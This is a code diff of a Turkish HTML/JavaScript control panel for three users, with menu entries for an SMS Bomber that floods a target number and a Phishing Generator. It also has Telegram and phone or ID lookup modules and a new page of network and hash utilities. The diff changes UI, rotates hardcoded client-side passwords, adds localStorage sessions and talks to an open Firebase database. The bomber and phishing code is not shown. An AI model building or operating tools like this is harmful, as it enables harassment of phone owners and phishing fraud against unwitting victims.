@@ -12,10 +12,10 @@ body{background:#0a0a0f;color:#e0e0e0;font-family:Arial;overflow-x:hidden}
 .kutu{background:#12121c;border:1px solid #2a2a3e;border-radius:16px;padding:45px 35px;width:360px;text-align:center;box-shadow:0 0 50px rgba(220,50,80,0.3)}
 .logo{font-size:34px;font-weight:bold;color:#dc3250;letter-spacing:10px;margin-bottom:5px;text-shadow:0 0 20px #dc3250}
 .alt{color:#555;font-size:11px;letter-spacing:3px;margin-bottom:30px}
-input{width:100%;padding:14px;background:#1a1a26;border:1px solid #2a2a3e;color:#e0e0e0;border-radius:8px;font-size:14px;text-align:center;letter-spacing:3px;outline:none;margin-bottom:12px}
-input:focus{border-color:#dc3250;box-shadow:0 0 15px rgba(220,50,80,0.4)}
-button{width:100%;padding:14px;background:#dc3250;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:bold;cursor:pointer;letter-spacing:2px}
-button:hover{background:#e84a66}
+input{width:100%;padding:14px;background:#1a1a26;border:1px solid #2a2a3e;color:#e0e0e0;border-radius:8px;font-size:14px;text-align:center;letter-spacing:2px;outline:none;margin-bottom:12px}
+input:focus{border-color:#dc3250}
+.kutu button{width:100%;padding:14px;background:#dc3250;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:bold;cursor:pointer;letter-spacing:2px}
+.kutu button:hover{background:#e84a66}
 .hata{color:#dc3250;font-size:12px;margin-top:12px;min-height:16px;font-weight:bold}
 #panel{display:none}
 .ust{background:#12121c;border-bottom:1px solid #2a2a3e;padding:12px 20px;display:flex;align-items:center;position:fixed;top:0;left:0;right:0;z-index:100}
@@ -49,6 +49,7 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
 .kutu2 b{color:#dc3250;font-size:22px;display:block;margin-top:6px}
 .sonuc{font-size:12px;margin-top:8px;color:#1e9b5c;word-break:break-word}
 .uyari{background:#12121c;border-left:3px solid #dc3250;padding:12px;color:#888;font-size:12px;margin-bottom:15px}
+.ara{color:#666;font-size:11px;margin:20px 0 10px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid #2a2a3e;padding-bottom:5px}
 </style>
 </head>
 <body>
@@ -75,13 +76,14 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
         <button onclick="sayfa('chat',this)">💬 Canlı Sohbet</button>
         <button onclick="sayfa('dukkan',this)">🛒 Dükkanlar</button>
         <button onclick="sayfa('notlar',this)">📝 Ortak Notlar</button>
-        <button onclick="sayfa('araclar',this)">🌟 Araçlar</button>
+        <button onclick="sayfa('araclar',this)">🌟 Günlük Araçlar</button>
+        <button onclick="sayfa('hack',this)">💻 Güvenlik Araçları</button>
         <button onclick="sayfa('telegram',this)">📨 Telegram Bot</button>
         <button onclick="sayfa('sms',this)">💣 SMS Bomber</button>
         <button onclick="sayfa('phish',this)">🎣 Phishing Gen</button>
         <button onclick="sayfa('operator',this)">📡 Operatör Sorgu</button>
         <button onclick="sayfa('id',this)">🆔 ID Sorgu</button>
-        <button onclick="sayfa('sistem',this)">🛠️ Sistem Araçları</button>
+        <button onclick="sayfa('ip',this)">🌐 IP Sorgu</button>
         <button onclick="sayfa('istatistik',this)">📊 İstatistikler</button>
     </aside>
 
@@ -89,14 +91,14 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
 
         <div class="sayfa aktif" id="sayfa-ana">
             <h2>KONTROL PANELİ</h2>
-            <div class="uyari">Hoş geldin <b id="hosgeldin">-</b>. Sol üstteki ☰ menüsünden tüm modüllere erişebilirsin.</div>
+            <div class="uyari">Hoş geldin <b id="hosgeldin">-</b>. Menüden modüllere erişebilirsin.</div>
             <div class="stat">
-                <div class="kutu2"><span>Telegram Mesajı</span><b id="st1">0</b></div>
-                <div class="kutu2"><span>SMS Gönderimi</span><b id="st2">0</b></div>
-                <div class="kutu2"><span>Phishing Üretimi</span><b id="st3">0</b></div>
-                <div class="kutu2"><span>Operatör Sorgusu</span><b id="st4">0</b></div>
-                <div class="kutu2"><span>ID Sorgusu</span><b id="st5">0</b></div>
-                <div class="kutu2"><span>Chat Mesajı</span><b id="st6">0</b></div>
+                <div class="kutu2"><span>Telegram</span><b id="st1">0</b></div>
+                <div class="kutu2"><span>SMS</span><b id="st2">0</b></div>
+                <div class="kutu2"><span>Phishing</span><b id="st3">0</b></div>
+                <div class="kutu2"><span>Operatör</span><b id="st4">0</b></div>
+                <div class="kutu2"><span>ID</span><b id="st5">0</b></div>
+                <div class="kutu2"><span>Chat</span><b id="st6">0</b></div>
             </div>
         </div>
 
@@ -104,7 +106,7 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
             <h2>CANLI SOHBET</h2>
             <div style="background:#12121c;border:1px solid #2a2a3e;border-radius:10px;padding:12px;max-width:800px">
                 <div style="color:#1e9b5c;font-size:12px;margin-bottom:10px">🟢 MYM Özel Oda - Aktif</div>
-                <div id="sohbet" style="height:350px;overflow-y:auto;padding:8px;background:#0a0a0f;border-radius:6px;margin-bottom:10px"></div>
+                <div id="sohbet" style="height:400px;overflow-y:auto;padding:8px;background:#0a0a0f;border-radius:6px;margin-bottom:10px"></div>
                 <div style="display:flex;gap:6px">
                     <input type="text" id="mesajInput" class="input" style="flex:1;max-width:none" placeholder="Mesaj yaz...">
                     <button class="btn" onclick="mesajGonder()">Gönder</button>
@@ -126,36 +128,86 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
         </div>
 
         <div class="sayfa" id="sayfa-araclar">
-            <h2>ARAÇLAR</h2>
+            <h2>GÜNLÜK ARAÇLAR</h2>
+            <div class="ara">MEDYA</div>
             <div class="kart"><h4>🎵 TikTok İndir</h4><input type="text" id="ttLink" class="input" placeholder="Link"><button class="btn mavi" onclick="tikTok()">İndir</button><div class="sonuc" id="ttSonuc"></div></div>
             <div class="kart"><h4>📸 Instagram İndir</h4><input type="text" id="igLink" class="input" placeholder="Link"><button class="btn mavi" onclick="insta()">İndir</button><div class="sonuc" id="igSonuc"></div></div>
             <div class="kart"><h4>📺 YouTube İndir</h4><input type="text" id="ytLink" class="input" placeholder="Link"><button class="btn mavi" onclick="youtube()">İndir</button><div class="sonuc" id="ytSonuc"></div></div>
             <div class="kart"><h4>🔗 Link Kısalt</h4><input type="text" id="uzunLink" class="input" placeholder="URL"><button class="btn sari" onclick="kisalt()">Kısalt</button><div class="sonuc" id="kisaSonuc"></div></div>
             <div class="kart"><h4>📱 QR Kod</h4><input type="text" id="qrMetin" class="input" placeholder="Metin"><button class="btn yesil" onclick="qrYap()">Oluştur</button><div id="qrSonuc" style="margin-top:10px"></div></div>
+
+            <div class="ara">GÜVENLİK VE ŞİFRE</div>
             <div class="kart"><h4>🔐 Şifre Üretici</h4><input type="number" id="pwUzunluk" class="input" value="16" style="max-width:100px"><button class="btn sari" onclick="sifreUret()">Üret</button><div class="sonuc" id="pwSonuc" style="font-family:Consolas,monospace"></div></div>
-            <div class="kart"><h4>🌍 IP Sorgula</h4><button class="btn mavi" onclick="ipSorgu()">Göster</button><div class="sonuc" id="ipSonuc"></div></div>
-            <div class="kart"><h4>🎨 Renk Paleti</h4><button class="btn sari" onclick="renkUret()">5 Renk</button><div id="renkSonuc" style="display:flex;gap:5px;margin-top:8px"></div></div>
-            <div class="kart"><h4>🎲 Zar</h4><button class="btn sari" onclick="zarAt()">At</button><div class="sonuc" id="zarSonuc" style="font-size:32px;text-align:center"></div></div>
-            <div class="kart"><h4>🪙 Yazı Tura</h4><button class="btn sari" onclick="yaziTura()">At</button><div class="sonuc" id="yaziSonuc" style="font-size:20px;text-align:center"></div></div>
+            <div class="kart"><h4>🔍 Base64 Kodla/Çöz</h4><textarea id="b64Metin" class="input" style="min-height:60px"></textarea><button class="btn sari" onclick="b64Kodla()">Kodla</button><button class="btn sari" onclick="b64Coz()">Çöz</button><div class="sonuc" id="b64Sonuc"></div></div>
+            <div class="kart"><h4>🌐 URL Kodla/Çöz</h4><input type="text" id="urlMetin" class="input" placeholder="Metin"><button class="btn mavi" onclick="urlKodla()">Kodla</button><button class="btn mavi" onclick="urlCoz()">Çöz</button><div class="sonuc" id="urlSonuc"></div></div>
+            <div class="kart"><h4>🔤 Metin Ters Çevir</h4><input type="text" id="tersMetin" class="input" placeholder="Metin"><button class="btn mavi" onclick="tersCevir()">Çevir</button><div class="sonuc" id="tersSonuc"></div></div>
+            <div class="kart"><h4>🔠 Harf Durumu</h4><input type="text" id="harfMetin" class="input" placeholder="Metin"><button class="btn sari" onclick="buyukYap()">BÜYÜK</button><button class="btn sari" onclick="kucukYap()">küçük</button><div class="sonuc" id="harfSonuc"></div></div>
+            <div class="kart"><h4>📋 Panoya Kopyala</h4><input type="text" id="kopyaMetin" class="input" placeholder="Metin"><button class="btn yesil" onclick="kopyala()">Kopyala</button><div class="sonuc" id="kopyaSonuc"></div></div>
+
+            <div class="ara">MATEMATİK VE HESAPLAMA</div>
             <div class="kart"><h4>🧮 Hesap Makinesi</h4><input type="text" id="hesapIfade" class="input" placeholder="5+3*2"><button class="btn mavi" onclick="hesapla()">Hesapla</button><div class="sonuc" id="hesapSonuc" style="font-size:20px"></div></div>
-            <div class="kart"><h4>🔤 Metin Ters</h4><input type="text" id="tersMetin" class="input" placeholder="Metin"><button class="btn mavi" onclick="tersCevir()">Çevir</button><div class="sonuc" id="tersSonuc"></div></div>
-            <div class="kart"><h4>🔢 Kelime Say</h4><textarea id="sayiMetin" class="input" style="min-height:70px"></textarea><button class="btn yesil" onclick="kelimeSay()">Say</button><div class="sonuc" id="sayiSonuc"></div></div>
-            <div class="kart"><h4>⏱️ Kronometre</h4><button class="btn yesil" onclick="kronBasla()">Başlat</button><button class="btn" onclick="kronDurdur()">Durdur</button><button class="btn sari" onclick="kronSifirla()">Sıfırla</button><div class="sonuc" id="kronSonuc" style="font-size:24px;font-family:Consolas,monospace">00:00:00</div></div>
-            <div class="kart"><h4>🔍 Base64</h4><textarea id="b64Metin" class="input" style="min-height:60px"></textarea><button class="btn sari" onclick="b64Kodla()">Kodla</button><button class="btn sari" onclick="b64Coz()">Çöz</button><div class="sonuc" id="b64Sonuc"></div></div>
-            <div class="kart"><h4>💱 Dolar → TL</h4><input type="number" id="usdMiktar" class="input" placeholder="USD"><button class="btn yesil" onclick="usdTry()">Çevir</button><div class="sonuc" id="usdSonuc"></div></div>
             <div class="kart"><h4>📊 Yüzde Hesapla</h4><input type="number" id="yuzdeA" class="input" placeholder="Sayı"><input type="number" id="yuzdeB" class="input" placeholder="Yüzde %"><button class="btn sari" onclick="yuzdeHesapla()">Hesapla</button><div class="sonuc" id="yuzdeSonuc"></div></div>
+            <div class="kart"><h4>🎯 Rastgele Sayı</h4><input type="number" id="minSayi" class="input" value="1"><input type="number" id="maxSayi" class="input" value="100"><button class="btn sari" onclick="rastgeleSayi()">Üret</button><div class="sonuc" id="rastgeleSonuc" style="font-size:24px;font-weight:bold"></div></div>
+            <div class="kart"><h4>🔢 Asal Sayı Kontrolü</h4><input type="number" id="asalSayi" class="input" placeholder="Sayı"><button class="btn yesil" onclick="asalKontrol()">Kontrol</button><div class="sonuc" id="asalSonuc"></div></div>
+            <div class="kart"><h4>📏 Birim Çevir</h4><input type="number" id="birimDeger" class="input" placeholder="Değer"><select id="birimTip" class="input"><option value="km-mi">km→mil</option><option value="mi-km">mil→km</option><option value="kg-lb">kg→lb</option><option value="lb-kg">lb→kg</option><option value="c-f">°C→°F</option><option value="f-c">°F→°C</option></select><button class="btn yesil" onclick="birimCevir()">Çevir</button><div class="sonuc" id="birimSonuc"></div></div>
+            <div class="kart"><h4>💱 Dolar → TL</h4><input type="number" id="usdMiktar" class="input" placeholder="USD"><button class="btn yesil" onclick="usdTry()">Çevir</button><div class="sonuc" id="usdSonuc"></div></div>
+
+            <div class="ara">ZAMAN VE TARİH</div>
+            <div class="kart"><h4>⏱️ Kronometre</h4><button class="btn yesil" onclick="kronBasla()">Başlat</button><button class="btn" onclick="kronDurdur()">Durdur</button><button class="btn sari" onclick="kronSifirla()">Sıfırla</button><div class="sonuc" id="kronSonuc" style="font-size:24px;font-family:Consolas,monospace">00:00:00</div></div>
+            <div class="kart"><h4>📅 Gün Farkı</h4><input type="text" id="tarih1" class="input" placeholder="01.01.2024"><input type="text" id="tarih2" class="input" placeholder="31.12.2024"><button class="btn sari" onclick="gunFarki()">Hesapla</button><div class="sonuc" id="gunFarkSonuc"></div></div>
             <div class="kart"><h4>🎂 Yaş Hesapla</h4><input type="number" id="dogumYili" class="input" placeholder="1990"><button class="btn mavi" onclick="yasHesapla()">Hesapla</button><div class="sonuc" id="yasSonuc"></div></div>
+            <div class="kart"><h4>🕐 Dünya Saati</h4><button class="btn mavi" onclick="dunyaSaati()">Göster</button><div class="sonuc" id="dunyaSonuc"></div></div>
+
+            <div class="ara">EĞLENCE</div>
+            <div class="kart"><h4>🎲 Zar At</h4><button class="btn sari" onclick="zarAt()">At</button><div class="sonuc" id="zarSonuc" style="font-size:32px;text-align:center"></div></div>
+            <div class="kart"><h4>🪙 Yazı Tura</h4><button class="btn sari" onclick="yaziTura()">At</button><div class="sonuc" id="yaziSonuc" style="font-size:20px;text-align:center"></div></div>
             <div class="kart"><h4>📖 Rastgele Söz</h4><button class="btn sari" onclick="rastgeleSoz()">Getir</button><div class="sonuc" id="sozSonuc"></div></div>
             <div class="kart"><h4>🍕 Yemek Öner</h4><button class="btn sari" onclick="yemekOner()">Öner</button><div class="sonuc" id="yemekSonuc"></div></div>
             <div class="kart"><h4>🎬 Film Öner</h4><button class="btn" onclick="filmOner()">Öner</button><div class="sonuc" id="filmSonuc"></div></div>
-            <div class="kart"><h4>🕐 Dünya Saati</h4><button class="btn mavi" onclick="dunyaSaati()">Göster</button><div class="sonuc" id="dunyaSonuc"></div></div>
-            <div class="kart"><h4>🔢 Asal Sayı</h4><input type="number" id="asalSayi" class="input" placeholder="Sayı"><button class="btn yesil" onclick="asalKontrol()">Kontrol</button><div class="sonuc" id="asalSonuc"></div></div>
-            <div class="kart"><h4>📅 Gün Farkı</h4><input type="text" id="tarih1" class="input" placeholder="01.01.2024"><input type="text" id="tarih2" class="input" placeholder="31.12.2024"><button class="btn sari" onclick="gunFarki()">Hesapla</button><div class="sonuc" id="gunFarkSonuc"></div></div>
+            <div class="kart"><h4>🎨 Renk Paleti</h4><button class="btn sari" onclick="renkUret()">5 Renk</button><div id="renkSonuc" style="display:flex;gap:5px;margin-top:8px"></div></div>
+            <div class="kart"><h4>🎵 Müzik Türü</h4><button class="btn mavi" onclick="muzikTuru()">Öner</button><div class="sonuc" id="muzikSonuc"></div></div>
+
+            <div class="ara">METİN</div>
+            <div class="kart"><h4>🔢 Kelime Sayacı</h4><textarea id="sayiMetin" class="input" style="min-height:70px"></textarea><button class="btn yesil" onclick="kelimeSay()">Say</button><div class="sonuc" id="sayiSonuc"></div></div>
             <div class="kart"><h4>📝 Yerel Not</h4><textarea id="yerelNot" class="input" style="min-height:60px"></textarea><button class="btn yesil" onclick="yerelKaydet()">Kaydet</button><button class="btn" onclick="yerelSil()">Sil</button></div>
-            <div class="kart"><h4>📋 Panoya Kopyala</h4><input type="text" id="kopyaMetin" class="input" placeholder="Metin"><button class="btn yesil" onclick="kopyala()">Kopyala</button><div class="sonuc" id="kopyaSonuc"></div></div>
-            <div class="kart"><h4>🔠 Harf Durumu</h4><input type="text" id="harfMetin" class="input" placeholder="Metin"><button class="btn sari" onclick="buyukYap()">BÜYÜK</button><button class="btn sari" onclick="kucukYap()">küçük</button><div class="sonuc" id="harfSonuc"></div></div>
-            <div class="kart"><h4>🎯 Rastgele Sayı</h4><input type="number" id="minSayi" class="input" value="1"><input type="number" id="maxSayi" class="input" value="100"><button class="btn sari" onclick="rastgeleSayi()">Üret</button><div class="sonuc" id="rastgeleSonuc" style="font-size:24px;font-weight:bold"></div></div>
-            <div class="kart"><h4>📏 Birim Çevir</h4><input type="number" id="birimDeger" class="input" placeholder="Değer"><select id="birimTip" class="input"><option value="km-mi">km→mil</option><option value="mi-km">mil→km</option><option value="kg-lb">kg→lb</option><option value="c-f">°C→°F</option></select><button class="btn yesil" onclick="birimCevir()">Çevir</button><div class="sonuc" id="birimSonuc"></div></div>
+        </div>
+
+        <div class="sayfa" id="sayfa-hack">
+            <h2>GÜVENLİK ARAÇLARI</h2>
+
+            <div class="ara">AĞ VE IP</div>
+            <div class="kart"><h4>🌍 IP Sorgula</h4><button class="btn mavi" onclick="ipSorgu()">Göster</button><div class="sonuc" id="ipSonuc"></div></div>
+            <div class="kart"><h4>📶 İnternet Hız Testi</h4><button class="btn sari" onclick="hizTest()">Test Et</button><div class="sonuc" id="hizSonuc"></div></div>
+            <div class="kart"><h4>🔎 Port Tarayıcı (Basit)</h4><input type="text" id="portHost" class="input" placeholder="host veya IP"><input type="text" id="portListe" class="input" placeholder="80,443,8080"><button class="btn sari" onclick="portTara()">Tara</button><div class="sonuc" id="portSonuc"></div></div>
+            <div class="kart"><h4>🌐 DNS Sorgu</h4><input type="text" id="dnsHost" class="input" placeholder="example.com"><button class="btn mavi" onclick="dnsSorgu()">Sorgula</button><div class="sonuc" id="dnsSonuc"></div></div>
+            <div class="kart"><h4>🔒 SSL Sertifika Kontrolü</h4><input type="text" id="sslHost" class="input" placeholder="example.com"><button class="btn yesil" onclick="sslKontrol()">Kontrol</button><div class="sonuc" id="sslSonuc"></div></div>
+
+            <div class="ara">HASH VE ŞİFRELEME</div>
+            <div class="kart"><h4>#️⃣ MD5 Hash</h4><input type="text" id="md5Metin" class="input" placeholder="Metin"><button class="btn sari" onclick="md5Yap()">Hash</button><div class="sonuc" id="md5Sonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
+            <div class="kart"><h4>#️⃣ SHA-1 Hash</h4><input type="text" id="sha1Metin" class="input" placeholder="Metin"><button class="btn sari" onclick="sha1Yap()">Hash</button><div class="sonuc" id="sha1Sonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
+            <div class="kart"><h4>#️⃣ SHA-256 Hash</h4><input type="text" id="sha256Metin" class="input" placeholder="Metin"><button class="btn sari" onclick="sha256Yap()">Hash</button><div class="sonuc" id="sha256Sonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
+
+            <div class="ara">SORGU ARAÇLARI</div>
+            <div class="kart"><h4>👤 Kullanıcı Adı Kontrol</h4><input type="text" id="userKontrol" class="input" placeholder="kullanici_adi"><button class="btn mavi" onclick="userKontrol()">Kontrol</button><div class="sonuc" id="userSonuc"></div></div>
+            <div class="kart"><h4>📧 Email Doğrulama</h4><input type="text" id="emailKontrol" class="input" placeholder="email@example.com"><button class="btn yesil" onclick="emailKontrol()">Kontrol</button><div class="sonuc" id="emailSonuc"></div></div>
+            <div class="kart"><h4>📱 Numara Doğrulama</h4><input type="text" id="numKontrol" class="input" placeholder="5XXXXXXXXX"><button class="btn yesil" onclick="numKontrol()">Kontrol</button><div class="sonuc" id="numSonuc"></div></div>
+            <div class="kart"><h4>💰 Kripto Fiyatı</h4><input type="text" id="kriptoCoin" class="input" placeholder="bitcoin / ethereum"><button class="btn sari" onclick="kriptoFiyat()">Sorgula</button><div class="sonuc" id="kriptoSonuc"></div></div>
+
+            <div class="ara">ŞİFRE ARAÇLARI</div>
+            <div class="kart"><h4>🔑 Şifre Güç Testi</h4><input type="text" id="sifreTest" class="input" placeholder="Şifre"><button class="btn mavi" onclick="sifreTest()">Test</button><div class="sonuc" id="sifreTestSonuc"></div></div>
+            <div class="kart"><h4>🎲 PIN Üretici</h4><input type="number" id="pinUzunluk" class="input" value="6"><button class="btn sari" onclick="pinUret()">Üret</button><div class="sonuc" id="pinSonuc" style="font-size:24px;font-weight:bold"></div></div>
+            <div class="kart"><h4>🔣 Hash Üretici (rastgele)</h4><input type="number" id="hashUzunluk" class="input" value="32"><button class="btn sari" onclick="hashUret()">Üret</button><div class="sonuc" id="hashSonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
+
+            <div class="ara">DOSYA ARAÇLARI</div>
+            <div class="kart"><h4>📄 Dosya Hash</h4><input type="file" id="hashDosya" class="input"><button class="btn mavi" onclick="dosyaHash()">Hash Al</button><div class="sonuc" id="dosyaHashSonuc"></div></div>
+            <div class="kart"><h4>🖼️ Base64 → Resim</h4><textarea id="b64Resim" class="input" style="min-height:60px" placeholder="data:image/png;base64,..."></textarea><button class="btn yesil" onclick="b64Resim()">Göster</button><div id="resimSonuc" style="margin-top:10px"></div></div>
+            <div class="kart"><h4>📝 Metin Diff</h4><textarea id="diffMetin1" class="input" style="min-height:60px" placeholder="Metin 1"></textarea><textarea id="diffMetin2" class="input" style="min-height:60px" placeholder="Metin 2"></textarea><button class="btn sari" onclick="metinDiff()">Karşılaştır</button><div class="sonuc" id="diffSonuc"></div></div>
+
+            <div class="ara">TEST ARAÇLARI</div>
+            <div class="kart"><h4>📊 Ping Testi</h4><input type="text" id="pingHost" class="input" placeholder="google.com"><button class="btn mavi" onclick="pingTest()">Ping</button><div class="sonuc" id="pingSonuc"></div></div>
+            <div class="kart"><h4>⏰ Unix Timestamp</h4><button class="btn sari" onclick="unixTime()">Şimdi</button><div class="sonuc" id="unixSonuc"></div></div>
+            <div class="kart"><h4>🆔 UUID Üretici</h4><button class="btn sari" onclick="uuidUret()">Üret</button><div class="sonuc" id="uuidSonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
+            <div class="kart"><h4>🔢 Rastgele Byte</h4><input type="number" id="byteUzunluk" class="input" value="16"><button class="btn sari" onclick="byteUret()">Üret</button><div class="sonuc" id="byteSonuc" style="font-family:Consolas,monospace;font-size:11px"></div></div>
         </div>
 
         <div class="sayfa" id="sayfa-telegram">
@@ -169,11 +221,12 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
 
         <div class="sayfa" id="sayfa-sms">
             <h2>SMS BOMBER</h2>
-            <label>Numara</label><input type="text" id="smsNumara" class="input" placeholder="5XX XXX XX XX">
+            <label>Numara (5XX XXX XX XX)</label><input type="text" id="smsNumara" class="input" placeholder="5XXXXXXXXX">
             <label>Adet</label><input type="number" id="smsAdet" class="input" value="50">
             <label>Gecikme (ms)</label><input type="number" id="smsGecikme" class="input" value="1000">
             <button class="btn" onclick="smsBasla()">💣 Başlat</button>
-            <div class="log" id="smsLog">[Sistem] Hazır.</div>
+            <button class="btn sari" onclick="smsDurdur()">⏹ Durdur</button>
+            <div class="log" id="smsLog">[Sistem] Hazır. Numara girin ve Başlat'a basın.</div>
         </div>
 
         <div class="sayfa" id="sayfa-phish">
@@ -199,19 +252,17 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
         </div>
 
         <div class="sayfa" id="sayfa-id">
-            <h2>ID SORGU</h2>
-            <label>Telegram ID / Kullanıcı Adı</label><input type="text" id="idSorguInput" class="input" placeholder="@kullanici">
+            <h2>TELEGRAM ID SORGU</h2>
+            <label>Kullanıcı Adı / ID</label><input type="text" id="idSorguInput" class="input" placeholder="@kullanici">
             <button class="btn sari" onclick="idSorgula()">🆔 Sorgula</button>
             <div class="log" id="idLog">[Sistem] Hazır.</div>
         </div>
 
-        <div class="sayfa" id="sayfa-sistem">
-            <h2>SİSTEM ARAÇLARI</h2>
-            <button class="btn" style="display:block;width:100%;max-width:400px;text-align:left" onclick="sysTarama()">📁 Dosya Taraması</button>
-            <button class="btn" style="display:block;width:100%;max-width:400px;text-align:left" onclick="sysOnbellek()">🧹 Önbellek Temizliği</button>
-            <button class="btn" style="display:block;width:100%;max-width:400px;text-align:left" onclick="sysPing()">🌐 Ping Testi</button>
-            <button class="btn" style="display:block;width:100%;max-width:400px;text-align:left" onclick="sysBilgi()">💻 Sistem Bilgisi</button>
-            <div class="log" id="sysLog">[Sistem] Hazır.</div>
+        <div class="sayfa" id="sayfa-ip">
+            <h2>IP SORGU</h2>
+            <label>IP Adresi (kendi için boş bırak)</label><input type="text" id="ipInput" class="input" placeholder="8.8.8.8">
+            <button class="btn mavi" onclick="ipDetay()">🔍 Sorgula</button>
+            <div class="log" id="ipLog">[Sistem] Hazır.</div>
         </div>
 
         <div class="sayfa" id="sayfa-istatistik">
@@ -230,7 +281,13 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
 </div>
 
 <script>
-var SIFRELER = {'murat2024!':'Murat','yusuf2024!':'Yusuf','muhammet2024!':'Muhammet Ali'};
+/* SIFRELER - her kullanici icin farkli */
+var SIFRELER = {
+    'MrT_Kng2024!':  'Murat',
+    'Ysf_Kng2024!':  'Yusuf',
+    'Mhmt_Kng2024!': 'Muhammet Ali'
+};
+
 var kullanici = null;
 var ist = {tg:0,sms:0,phish:0,op:0,id:0,chat:0};
 var fbUrl = 'https://mym-1-ffae2-default-rtdb.firebaseio.com';
@@ -239,27 +296,44 @@ var kronTimer = null;
 var kronSaniye = 0;
 var smsDongu = null;
 
+/* OTURUM YUKLE - sayfa yenilenince sifre sormaz */
+window.addEventListener('load', function(){
+    var kayitli = localStorage.getItem('mym_oturum');
+    if(kayitli){
+        kullanici = kayitli;
+        panelAc();
+    }
+    istGuncelle();
+});
+
 function girisYap(){
     var s = document.getElementById('sifre').value.trim();
     var h = document.getElementById('hata');
     if(SIFRELER[s]){
         kullanici = SIFRELER[s];
-        document.getElementById('giris').classList.add('hidden');
-        document.getElementById('panel').style.display = 'block';
-        document.getElementById('aktifKullanici').innerText = kullanici;
-        document.getElementById('hosgeldin').innerText = kullanici;
-        chatBaslat();
-        dukkanYukle();
-        notYukle();
-        var yn = document.getElementById('yerelNot');
-        if(yn) yn.value = localStorage.getItem('mym_not_'+kullanici)||'';
+        localStorage.setItem('mym_oturum', kullanici);
+        panelAc();
     } else {
         h.innerText = 'HATALI ERİŞİM KODU!';
     }
 }
 
+function panelAc(){
+    document.getElementById('giris').classList.add('hidden');
+    document.getElementById('panel').style.display = 'block';
+    document.getElementById('aktifKullanici').innerText = kullanici;
+    document.getElementById('hosgeldin').innerText = kullanici;
+    chatBaslat();
+    dukkanYukle();
+    notYukle();
+    var yn = document.getElementById('yerelNot');
+    if(yn) yn.value = localStorage.getItem('mym_not_'+kullanici)||'';
+}
+
 function cikisYap(){
+    if(!confirm('Çıkış yapmak istediğine emin misin?')) return;
     kullanici = null;
+    localStorage.removeItem('mym_oturum');
     document.getElementById('sifre').value = '';
     document.getElementById('giris').classList.remove('hidden');
     document.getElementById('panel').style.display = 'none';
@@ -305,6 +379,7 @@ function esc(s){
     });
 }
 
+/* CHAT */
 function chatBaslat(){
     if(chatTimer) clearInterval(chatTimer);
     chatCek();
@@ -320,9 +395,10 @@ function chatCek(){
         if(!k) return;
         k.innerHTML = '';
         if(!data) return;
-        var arr = Object.values(data).sort(function(a,b){return a.ts-b.ts});
+        var arr = Object.values(data).sort(function(a,b){return (a.ts||0)-(b.ts||0)});
         for(var i=0;i<arr.length;i++){
             var m = arr[i];
+            if(!m || !m.name || !m.text || !m.ts) continue;
             var d = document.createElement('div');
             var benim = m.name === kullanici;
             d.style.cssText = 'max-width:75%;padding:8px 12px;border-radius:10px;font-size:13px;margin-bottom:6px;word-wrap:break-word;'+(benim?'margin-left:auto;background:#dc3250;color:#fff;text-align:right':'background:#1a1a26;color:#e0e0e0');
@@ -347,6 +423,7 @@ function mesajGonder(){
     }).catch(function(e){alert('Hata: '+e.message);});
 }
 
+/* DUKKAN */
 var DUKKAN_SAHIP = ['Murat','Yusuf','Muhammet Ali'];
 
 function dukkanYukle(){
@@ -411,6 +488,7 @@ function urunSil(id){
     .then(function(){dukkanYukle()});
 }
 
+/* NOTLAR */
 function notYukle(){
     fetch(fbUrl+'/notes.json')
     .then(function(r){return r.json()})
@@ -430,6 +508,7 @@ function notCiz(data){
     anahtarlar.sort(function(a,b){return data[b].ts - data[a].ts});
     for(var i=0;i<anahtarlar.length;i++){
         var n = data[anahtarlar[i]];
+        if(!n.title || !n.body) continue;
         var d = document.createElement('div');
         d.className = 'kart';
         var html = '<h4>'+esc(n.title)+'</h4>';
@@ -460,272 +539,180 @@ function notSil(id){
     fetch(fbUrl+'/notes/'+id+'.json',{method:'DELETE'}).then(function(){notYukle()});
 }
 
-function tikTok(){
-    var u = document.getElementById('ttLink').value.trim();
-    if(!u){document.getElementById('ttSonuc').innerText='Link gerekli';return;}
-    document.getElementById('ttSonuc').innerHTML = '<a href="https://www.tikwm.com/api/?url='+encodeURIComponent(u)+'" target="_blank" style="color:#3b82f6">TikWM ile aç</a>';
-}
-function insta(){
-    var u = document.getElementById('igLink').value.trim();
-    if(!u){document.getElementById('igSonuc').innerText='Link gerekli';return;}
-    document.getElementById('igSonuc').innerHTML = '<a href="https://snapinsta.app/" target="_blank" style="color:#3b82f6">SnapInsta ile aç</a>';
-}
-function youtube(){
-    var u = document.getElementById('ytLink').value.trim();
-    if(!u){document.getElementById('ytSonuc').innerText='Link gerekli';return;}
-    document.getElementById('ytSonuc').innerHTML = '<a href="https://ssyoutube.com/" target="_blank" style="color:#3b82f6">SSYouTube ile aç</a>';
-}
-function kisalt(){
-    var u = document.getElementById('uzunLink').value.trim();
-    if(!u){document.getElementById('kisaSonuc').innerText='URL gerekli';return;}
-    fetch('https://tinyurl.com/api-create.php?url='+encodeURIComponent(u))
-    .then(function(r){return r.text()})
-    .then(function(s){document.getElementById('kisaSonuc').innerText = s})
-    .catch(function(){document.getElementById('kisaSonuc').innerText = 'Hata'});
-}
-function qrYap(){
-    var t = document.getElementById('qrMetin').value.trim();
-    if(!t){document.getElementById('qrSonuc').innerText='Metin gerekli';return;}
-    var img = document.createElement('img');
-    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=180x180&data='+encodeURIComponent(t);
-    img.style.background = '#fff';
-    img.style.padding = '5px';
-    img.style.borderRadius = '6px';
-    var k = document.getElementById('qrSonuc');
-    k.innerHTML = '';
-    k.appendChild(img);
-}
-function sifreUret(){
